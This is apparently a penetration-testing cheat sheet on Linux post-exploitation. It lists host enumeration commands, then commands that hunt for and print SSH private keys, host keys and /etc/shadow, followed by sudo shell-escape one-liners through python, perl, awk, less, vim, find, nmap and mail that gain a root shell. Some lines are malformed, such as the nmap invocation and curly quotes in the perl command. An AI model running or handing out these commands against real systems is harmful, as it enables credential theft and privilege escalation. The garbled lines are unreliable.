# Linux-Exploitation

## Internal Enumeration

#### ID and location
```
id
pwd
```

#### OS / Version / Architecture
```
cat /etc/*-release
uname -i
uname -a
uname -r
cat /proc/version
hostnamectl | grep Kernel
lsb_release -a (Debian based OSs)
```

#### Packaged installed
```
dpkg -l (Debian based OSs)
rpm -qa (CentOS / openSUSE )
```

#### Running services and network services
```
ps aux
netstat -antup
```

#### Network
```
ifconfig
ip addr show
arp -a
```

#### Search a file
```
find . -name "*.txt"
```

#### Read SSH key
```
ls -la /home /root /etc/ssh /home/*/.ssh/; locate id_rsa; locate id_dsa; find / -name id_rsa 2> /dev/null; find / -name id_dsa 2> /dev/null; find / -name authorized_keys 2> /dev/null; cat /home/*/.ssh/id_rsa; cat /home/*/.ssh/id_dsa

cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
```


## Automated enumeration


## Sudoers - Privesc

##### python
```
sudo -u root /usr/bin/python
>>> from subprocess import call
>>> call(['/bin/bash'])
```

##### perl
```
sudo -u root /usr/bin/perl -e ‘`/bin/bash`’
```

##### cp + chmod
```
sudo -u root /bin/cp exploit exploit
sudo -u root /bin/chmod +xs exploit
./exploit
```

##### awk
```
awk 'BEGIN {system("/bin/bash")}'
```

##### less
```
Solution 1 - read a file
sudo -u root /usr/bin/less /etc/shadow
 
Solution 2 - create a file
sudo -u root /usr/bin/less 
then insert the following command :
!/bin/bash
```

##### vim
```
sudo -u victim /usr/bin/vim
puis on tape (pas dans le fichier mais de la même manière que lorsque l'on souhaite quitter vim):
:!/bin/bash
```

##### find
```
sudo -u root /usr/bin/find /bin -name "bash" -exec {} \;
```

##### Bash
```
sudo -u root /bin/bash
```

##### nmap
```
 sudo -u nmap –interactive
nmap>!bash
or
nmap>!sh
```

##### Mail
```
sudo mail --exec='!/bin/bash'
```
